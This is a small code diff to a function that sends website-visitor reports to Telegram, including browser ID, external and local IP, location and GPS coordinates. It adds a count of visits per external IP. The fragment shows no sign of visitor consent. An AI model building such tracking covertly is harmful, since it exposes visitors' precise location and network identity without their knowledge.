@@ -61,6 +61,9 @@ function sendVisitToTelegram_(data){
     `👤 Visitante: ${visibleName} · ${visitLabel}`,
     data.idNavegador ? `🆔 ID navegador: ${data.idNavegador}` : "",
     data.ipExterna ? `🌐 IP externa: ${data.ipExterna}` : "",
+    data.ipExterna && data.visitasIpExterna
+      ? `🔁 Visitas registradas desde esta IP: ${data.visitasIpExterna}`
+      : "",
     data.ipLocal ? `🏠 IP local: ${data.ipLocal}` : "",
     `📍 Ubicación: ${locationText}`,
     `🎯 GPS: ${gpsText}`,
